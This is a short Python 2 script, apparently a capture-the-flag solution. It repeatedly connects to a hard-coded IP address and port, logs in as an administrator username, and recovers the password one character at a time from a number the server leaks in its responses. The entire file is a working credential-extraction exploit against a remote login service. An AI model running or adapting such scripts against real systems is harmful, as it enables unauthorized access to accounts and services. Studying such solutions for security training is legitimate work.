import socket
import struct
import time
import telnetlib
import string

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '54.217.202.218'
port = 3000

p = "THEpasswordISreallyLONGbutYOUllGETtoTH"
for i in range(1, 20):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	f = s.makefile('rw', bufsize=0)
        readuntil(f, "username:\n")
        f.write("4dM1N15TR4T0R\n")
	readuntil(f, "password?")
	f.write(p + "\n")
        data = readuntil(f, ")")
        data += ")"
	start = data.find("-")
        end = data.find(")")
        xx = data[start + 1:end]
	pp = string.atoi(xx)
	p += chr(pp)
	print p
	#s.close()

print p
